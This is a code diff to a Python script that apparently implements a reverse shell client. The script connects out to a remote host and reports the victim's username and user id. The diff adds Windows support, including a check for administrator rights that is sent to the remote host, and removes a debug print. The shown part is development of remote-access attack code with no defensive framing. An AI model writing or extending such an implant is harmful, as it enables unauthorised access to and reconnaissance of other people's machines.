@@ -3,6 +3,7 @@ import time
 import subprocess
 import os
 import sys
+import ctypes
 import pwd
 import platform
 
@@ -28,14 +29,17 @@ def outbound_message(message):
     response = str(message).encode()
     sock.send(response)
     print('[+] Reply sent...')
-    print(message)
 
 
 def session_handler():
     print(f'[+] Connecting to {host_ip}')
     sock.connect((host_ip, host_port))
-    outbound_message(pwd.getpwuid(os.getuid())[0])
-    outbound_message(os.getuid())
+    if platform.system() == 'Windows':
+        outbound_message(os.getlogin())
+        outbound_message(ctypes.windll.shell32.IsUserAnAdmin())
+    else:
+        outbound_message(pwd.getpwuid(os.getuid())[0])
+        outbound_message(os.getuid())
 
     print(f'[+] Connected to {host_ip}')
     while True:
